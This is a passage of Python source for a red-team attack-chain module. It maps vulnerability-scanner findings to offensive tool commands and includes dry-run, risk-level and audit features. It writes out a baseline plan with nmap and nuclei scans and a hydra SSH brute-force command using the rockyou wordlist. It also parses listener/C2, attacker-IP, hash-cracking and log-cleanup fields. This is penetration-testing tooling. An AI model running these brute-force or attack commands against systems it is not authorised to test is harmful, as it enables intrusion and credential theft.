            finding_type=finding_dict.get("type", "unknown"),
            target=self._summarize_target(target_info),
        )

        risk_level = mapping.get("risk_level", 5)

        self._prepared_count += 1

        prepared = PreparedAttack(
            tool=mapping["tool"],
            command=command,
            docker_command=docker_command,
            description=mapping["description"],
            risk_level=risk_level,
            audit_entry=audit_entry,
        )

        logger.info(
            "Prepared attack #%d: %s -> %s (risk=%d)",
            self._prepared_count,
            prepared.tool,
            prepared.audit_entry.get("target_summary", "?"),
            prepared.risk_level,
        )
        return prepared

    # -----------------------------------------------------------------
    # Bulk preparation helpers
    # -----------------------------------------------------------------

    def prepare_all_attacks(
        self, findings_list: List[Dict[str, Any]]
    ) -> List[PreparedAttack]:
        """Prepare attacks for all findings in one call.

        Convenience method that iterates findings, resolves tools via
        ``get_attack_options``, and produces PreparedAttack objects.

        Args:
            findings_list: List of finding dicts.

        Returns:
            List of PreparedAttack objects.
        """
        prepared: List[PreparedAttack] = []
        for finding in findings_list:
            vuln_type = finding.get("type", "")
            mapping = self.vuln_tool_map.get(vuln_type)
            if mapping is not None:
                attack = self.prepare_attack(mapping["tool"], finding)
                prepared.append(attack)
        return prepared

    def get_risk_summary(
        self, attacks: List[PreparedAttack]
    ) -> Dict[str, int]:
        """Summarize attack risk levels by category.

        Args:
            attacks: List of PreparedAttack objects.

        Returns:
            Dict mapping risk label to count of attacks in that range.
        """
        buckets: Dict[str, int] = {
            "critical_9_10": 0,
            "high_7_8": 0,
            "medium_4_6": 0,
            "low_1_3": 0,
        }
        for attack in attacks:
            rl = attack.risk_level
            if rl >= 9:
                buckets["critical_9_10"] += 1
            elif rl >= 7:
                buckets["high_7_8"] += 1
            elif rl >= 4:
                buckets["medium_4_6"] += 1
            else:
                buckets["low_1_3"] += 1
        return buckets

    def list_available_tools(self) -> List[Dict[str, Any]]:
        """List all available tools with their metadata.

        Returns:
            List of dicts with tool, vuln_type, category, risk_level.
        """
        tools: List[Dict[str, Any]] = []
        for vuln_type, config in self.vuln_tool_map.items():
            tools.append({
                "vuln_type": vuln_type,
                "tool": config["tool"],
                "category": config["category"],
                "risk_level": config["risk_level"],
                "severity": config["severity"],
                "requires_docker": config.get("requires_docker", False),
            })
        return tools

    def get_tools_by_category(
        self, category: str
    ) -> List[Dict[str, Any]]:
        """Filter available tools by attack category.

        Args:
            category: Category string (e.g. "exploitation", "brute_force").

        Returns:
            List of matching tool metadata dicts.
        """
        return [
            t for t in self.list_available_tools()
            if t["category"] == category
        ]

    def get_high_risk_attacks(
        self, min_risk: int = 7
    ) -> List[Dict[str, Any]]:
        """Return tools with risk level at or above min_risk.

        Args:
            min_risk: Minimum risk level threshold (default 7).

        Returns:
            List of tool metadata dicts meeting the risk threshold.
        """
        return [
            t for t in self.list_available_tools()
            if t["risk_level"] >= min_risk
        ]

    # -----------------------------------------------------------------
    # Dashboard integration (v0.21)
    # -----------------------------------------------------------------

    def chain_for_scan(self, scan_id: int, db_path: str | None = None) -> List[Dict[str, Any]]:
        """Map a stored scan's findings to attack options.

        Loads the scan from the central SQLite store, converts each
        finding row into a finding dict, and runs the keyword → tool
        mapping. Returns a list of plain dicts (JSON-safe) shaped for
        the dashboard Attack Chain tab:
            {category, tool, cmd, target, finding, risk_level}
        """
        import json as _json
        import db_store

        data = db_store.get_scan(int(scan_id), db_path)
        findings: List[Dict[str, Any]] = []
        for row in data.get("findings") or []:
            f: Dict[str, Any] = {
                "title": row.get("title") or "",
                "host": row.get("host") or "",
            }
            try:
                detail = _json.loads(row.get("detail") or "{}")
                if isinstance(detail, dict):
                    for k, v in detail.items():
                        if isinstance(v, (str, int, float)) and k not in f:
                            f[k] = v
            except Exception:
                pass
            findings.append(f)

        out: List[Dict[str, Any]] = []
        for f in findings:
            for opt in self.get_attack_options(f):
                out.append({
                    "category": opt.category,
                    "tool": opt.tool,
                    "cmd": opt.command,
                    "target": f.get("host") or f.get("url") or f.get("target_host") or "",
                    "finding": (f.get("title") or "")[:80],
                    "risk_level": opt.risk_level,
                })
        return out

    def default_chain(self) -> List[Dict[str, Any]]:
        """Baseline attack plan used when no scan data is available."""
        return [
            {"category": "recon", "tool": "nmap",
             "cmd": "nmap -sV -sC --top-ports 100 <target>",
             "target": "<target>", "finding": "baseline port sweep",
             "risk_level": 3},
            {"category": "recon", "tool": "nuclei",
             "cmd": "nuclei -target <target> -severity low,medium,high,critical -silent",
             "target": "<target>", "finding": "baseline template scan",
             "risk_level": 4},
            {"category": "tls", "tool": "testssl.sh",
             "cmd": "testssl.sh --quiet <target>",
             "target": "<target>", "finding": "baseline TLS audit",
             "risk_level": 2},
            {"category": "creds", "tool": "hydra",
             "cmd": ("hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt "
                     "-P /usr/share/wordlists/rockyou.txt <target> ssh"),
             "target": "<target>",
             "finding": "baseline credential test (PLAN-ONLY)",
             "risk_level": 8},
        ]

    # -----------------------------------------------------------------
    # Internal helpers
    # -----------------------------------------------------------------

    def _extract_target_info(
        self, finding_dict: Dict[str, Any]
    ) -> Dict[str, str]:
        """Extract target information from a finding dict.

        Maps common key names to the placeholder names used in templates.
        Handles the various naming conventions found in scanner output.

        Args:
            finding_dict: A finding dict with scanner-specific keys.

        Returns:
            Dict mapping template placeholder names to string values.
        """
        info: Dict[str, str] = {}

        # URL mapping
        if "url" in finding_dict:
            info["target_url"] = str(finding_dict["url"])
        if "target_url" in finding_dict:
            info["target_url"] = str(finding_dict["target_url"])

        # Host mapping
        for host_key in ("host", "target_host", "ip", "address"):
            if host_key in finding_dict:
                info["target_host"] = str(finding_dict[host_key])
                break

        # Port mapping
        for port_key in ("port", "target_port"):
            if port_key in finding_dict:
                info["target_port"] = str(finding_dict[port_key])
                break

        # Extract hostname from URL if host not directly provided
        if "target_host" not in info and "target_url" in info:
            from urllib.parse import urlparse
            try:
                parsed = urlparse(info["target_url"])
                host = parsed.hostname or ""
                if host:
                    info["target_host"] = host
                if parsed.port:
                    info["target_port"] = str(parsed.port)
                # Reconstruct URL without trailing slash for tool compat
                info["target_url"] = info["target_url"].rstrip("/")
            except Exception:
                pass

        # Synthesize target_url from host when only a hostname is known
        if "target_url" not in info and info.get("target_host"):
            info["target_url"] = "https://" + info["target_host"]

        # Default ports for common services
        if "target_port" not in info:
            # Fallback: extract port from free text (e.g. "... open on port 22")
            import re as _re
            _text = " ".join(str(v) for v in finding_dict.values())
            _m = _re.search(r"port\s+(\d{1,5})", _text)
            if _m:
                info["target_port"] = _m.group(1)
        if "target_port" not in info:
            vuln_type = finding_dict.get("type", "")
            default_ports: Dict[str, str] = {
                "OPEN_PORT_FTP": "21",
                "OPEN_PORT_SSH": "22",
                "OPEN_PORT_TELNET": "23",
                "OPEN_PORT_RDP": "3389",
                "OPEN_PORT_MYSQL": "3306",
                "OPEN_PORT_POSTGRES": "5432",
                "OPEN_PORT_SMB": "445",
                "WEAK_PASSWORD_FTP": "21",
                "WEAK_PASSWORD_SSH": "22",
                "WEAK_PASSWORD_TELNET": "23",
                "WEAK_PASSWORD_RDP": "3389",
                "WEAK_PASSWORD_SMB": "445",
            }
            if vuln_type in default_ports:
                info["target_port"] = default_ports[vuln_type]

        # Credential mapping
        for user_key in ("username", "user", "login"):
            if user_key in finding_dict:
                info["username"] = str(finding_dict[user_key])
                break

        for pass_key in ("password", "pass", "passwd"):
            if pass_key in finding_dict:
                info["password"] = str(finding_dict[pass_key])
                break

        for domain_key in ("domain", "ad_domain", "workgroup"):
            if domain_key in finding_dict:
                info["domain"] = str(finding_dict[domain_key])
                break

        # Domain name for recon tools
        for dom_key in ("domain_name", "target_domain", "fqdn"):
            if dom_key in finding_dict:
                info["target_domain"] = str(finding_dict[dom_key])
                break

        # CVE information
        if "cve_id" in finding_dict:
            info["cve_id"] = str(finding_dict["cve_id"])
        if "cve" in finding_dict:
            info["cve_id"] = str(finding_dict["cve"])

        # Exploit details for CVE_MATCH
        if "exploit_path" in finding_dict:
            info["exploit_path"] = str(finding_dict["exploit_path"])
        if "payload" in finding_dict:
            info["payload"] = str(finding_dict["payload"])

        # Listener / C2 configuration
        if "listener_host" in finding_dict:
            info["listener_host"] = str(finding_dict["listener_host"])
        if "listener_port" in finding_dict:
            info["listener_port"] = str(finding_dict["listener_port"])
        if "attacker_ip" in finding_dict:
            info["attacker_ip"] = str(finding_dict["attacker_ip"])
        if "gateway" in finding_dict:
            info["gateway"] = str(finding_dict["gateway"])

        # SSH key for remote execution
        if "ssh_key" in finding_dict:
            info["ssh_key"] = str(finding_dict["ssh_key"])
        if "ssh_user" in finding_dict:
            info["ssh_user"] = str(finding_dict["ssh_user"])

        # Hash cracking
        if "hash_file" in finding_dict:
            info["hash_file"] = str(finding_dict["hash_file"])
        if "hash_mode" in finding_dict:
            info["hash_mode"] = str(finding_dict["hash_mode"])
        if "hash_format" in finding_dict:
            info["hash_format"] = str(finding_dict["hash_format"])

        # Log cleanup
        if "log_files" in finding_dict:
            info["log_files"] = str(finding_dict["log_files"])

        return info

    def _summarize_target(self, target_info: Dict[str, str]) -> str:
        """Build a one-line summary of the target for audit logging.

        Args:
            target_info: The resolved target info dict.

        Returns:
            Human-readable target summary string.
        """
        parts: List[str] = []
        if "target_host" in target_info:
            host = target_info["target_host"]
            if "target_port" in target_info:
                host = f"{host}:{target_info['target_port']}"
            parts.append(host)
        elif "target_url" in target_info:
            parts.append(target_info["target_url"])
        elif "target_domain" in target_info:
            parts.append(target_info["target_domain"])
        elif "hash_file" in target_info:
            parts.append(target_info["hash_file"])

        if not parts:
            parts.append("<no target>")
        return " ".join(parts)

    def _build_audit_entry(
        self,
        tool: str,
        command: str,
        finding_type: str,
        target: str,
    ) -> Dict[str, Any]:
        """Build an audit trail entry for a prepared attack.

        Args:
            tool: Tool name.
            command: Resolved command string.
            finding_type: The vulnerability type string.
            target: Target summary string.

        Returns:
            Dict with timestamp, tool, finding type, target, command hash.
        """
        import hashlib
        timestamp = datetime.datetime.utcnow().isoformat() + "Z"
        command_hash = hashlib.sha256(command.encode()).hexdigest()[:16]

        return {
            "timestamp": timestamp,
            "tool": tool,
            "finding_type": finding_type,
            "target_summary": target,
            "command_preview": (
                command[:120] + "..." if len(command) > 120 else command
            ),
            "command_hash": command_hash,
            "dry_run": self.dry_run,
            "operator": "<OPERATOR_PLACEHOLDER>",
        }

    # -----------------------------------------------------------------
    # Command generation utilities
    # -----------------------------------------------------------------

    @staticmethod
    def escape_shell_arg(arg: str) -> str:
        """Safely escape a string for shell argument use.

        Args:
            arg: Raw string value.

        Returns:
            Shell-escaped string.
        """
        return shlex.quote(arg)

    @staticmethod
    def build_docker_command(
        tool: str,
        command: str,
        extra_volumes: Optional[List[str]] = None,
        network_mode: str = "host",
    ) -> str:
        """Wrap a command in a Docker run invocation.

        Args:
            tool: Tool name (used to find Docker image).
            command: The inner command to run inside the container.
            extra_volumes: Optional list of additional host:container mounts.
            network_mode: Docker network mode (default "host").

        Returns:
            Complete Docker run command string.
        """
        image = DOCKER_IMAGES.get(tool, f"{tool}:latest")
        vol_flags = f"-v /tmp:/tmp"
        for v in (extra_volumes or []):
            vol_flags += f" -v {v}"

        return (
            f"docker run --rm --network {network_mode} "
            f"{vol_flags} {image} {command}"
        )

    @staticmethod
    def validate_required_fields(
        finding_dict: Dict[str, Any],
        required: List[str],
    ) -> Tuple[bool, List[str]]:
        """Check that a finding dict contains all required fields.

        Args:
            finding_dict: The finding to validate.
            required: List of required field names.

        Returns:
            Tuple of (all_present: bool, missing_fields: list).
        """
        missing: List[str] = []
        for field_name in required:
            if field_name not in finding_dict:
                missing.append(field_name)
        return (len(missing) == 0, missing)

    # -----------------------------------------------------------------
    # String representations
    # -----------------------------------------------------------------

    def __repr__(self) -> str:
        return (
            f"SmartAttackChain("
            f"mappings={len(self.vuln_tool_map)}, "
            f"confirm_threshold={self.confirmation_threshold}, "
            f"dry_run={self.dry_run}, "
            f"prepared={self._prepared_count})"
        )

    def __str__(self) -> str:
        categories: Dict[str, int] = {}
        for cfg in self.vuln_tool_map.values():
            cat = cfg["category"]
            categories[cat] = categories.get(cat, 0) + 1

        lines = [
            f"SmartAttackChain – {len(self.vuln_tool_map)} vulnerability "
            f"mappings across {len(categories)} categories:",
        ]
        for cat, count in sorted(categories.items()):
            label = CATEGORY_LABELS.get(cat, cat.upper())
            lines.append(f"  [{label}] {count} tools")
        lines.append(
            f"  Confirm threshold: risk >= {self.confirmation_threshold}"
        )
        lines.append(f"  Dry run: {self.dry_run}")
        lines.append(f"  Attacks prepared this session: {self._prepared_count}")
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Module-level convenience functions
# ---------------------------------------------------------------------------

def quick_attack_options(
    findings: List[Dict[str, Any]],
) -> List[AttackOption]:
    """One-liner to get attack options from a list of findings.

    Creates a default SmartAttackChain and runs analyze_findings.

    Args:
        findings: List of finding dicts with ``type`` keys.

    Returns:
        List of AttackOption objects.
    """
    chain = SmartAttackChain(dry_run=True)
    return chain.analyze_findings(findings)


def quick_prepare(
    tool_name: str,
    finding_dict: Dict[str, Any],
) -> PreparedAttack:
    """One-liner to prepare an attack for a tool and finding.

    Args:
        tool_name: Tool name (e.g. "sqlmap", "hydra").
        finding_dict: Finding dict with target information.

    Returns:
        PreparedAttack object.
    """
    chain = SmartAttackChain(dry_run=True)
    return chain.prepare_attack(tool_name, finding_dict)


def list_all_tools() -> None:
    """Print a formatted table of all available attack tools."""
    chain = SmartAttackChain()
    tools = chain.list_available_tools()
    print(f"\n{'Type':<30} {'Tool':<18} {'Category':<18} {'Risk':>4}  {'Docker':>6}")
    print("-" * 85)
    for t in sorted(tools, key=lambda x: x["risk_level"], reverse=True):
        docker_flag = "Yes" if t["requires_docker"] else "No"
        print(
            f"{t['vuln_type']:<30} {t['tool']:<18} "
            f"{t['category']:<18} {t['risk_level']:>4}  {docker_flag:>6}"
        )
    print(f"\nTotal: {len(tools)} tools")


# ---------------------------------------------------------------------------
# CLI entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import sys
    import json

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    if len(sys.argv) > 1 and sys.argv[1] == "--list":
        list_all_tools()
    elif len(sys.argv) > 1 and sys.argv[1] == "--json":
        # Print the full VULN_TOOL_MAP as JSON for downstream consumers
        # Strip non-serializable fields
        serializable = {}
        for k, v in VULN_TOOL_MAP.items():
            serializable[k] = {
                key: val for key, val in v.items()
            }
        print(json.dumps(serializable, indent=2))
    else:
        print(str(SmartAttackChain()))
        print("\nUsage:")
        print("  python attack_chain.py --list    # List all attack tools")
        print("  python attack_chain.py --json    # Export mapping as JSON")
        print("\nProgrammatic usage:")
        print("  from modules.redteam.attack_chain import SmartAttackChain")
        print("  chain = SmartAttackChain()")
        print("  options = chain.analyze_findings(findings)")
